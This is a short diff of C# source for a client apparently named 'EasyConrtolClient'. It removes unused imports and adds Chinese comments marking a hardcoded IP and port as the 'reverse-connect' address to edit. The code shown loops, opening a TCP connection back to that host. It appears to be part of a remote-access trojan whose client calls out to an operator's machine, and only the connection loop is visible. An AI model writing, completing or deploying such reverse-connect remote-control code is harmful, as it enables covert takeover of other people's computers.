@@ -1,15 +1,12 @@
-﻿using System;
-using System.Collections.Generic;
+using System;
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
-using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace EasyConrtolClient
@@ -31,8 +28,8 @@ namespace EasyConrtolClient
         {
             while (true)
             {
-                string ip = "192.168.2.24";
-                int port = 12345;
+                string ip = "192.168.2.24"; // ← 反连IP 修改此处
+                int port = 12345; // ← 反连端口 修改此处
                 TcpClient tcpClient = new TcpClient();
                 while (!tcpClient.Connected)
                 {
